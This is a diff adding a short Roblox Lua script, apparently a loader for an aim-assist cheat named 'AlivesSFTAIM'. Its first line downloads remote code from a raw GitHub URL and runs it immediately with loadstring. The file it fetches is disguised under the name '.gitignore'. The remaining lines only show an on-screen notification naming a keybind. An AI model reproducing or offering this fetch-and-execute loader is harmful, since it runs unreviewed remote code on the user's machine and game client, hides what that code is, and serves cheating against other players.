@@ -1,0 +1,7 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/UserMask/gfhfh/main/.gitignore'),true))()
+wait(0.2)
+game.StarterGui:SetCore("SendNotification", {
+Title = "AlivesSFTAIM"; -- the title 
+Text = "Thanks For Using Keybind: q❤️"; -- what the text says 
+Duration = 1000000000; -- how long the notification should in secounds
+})
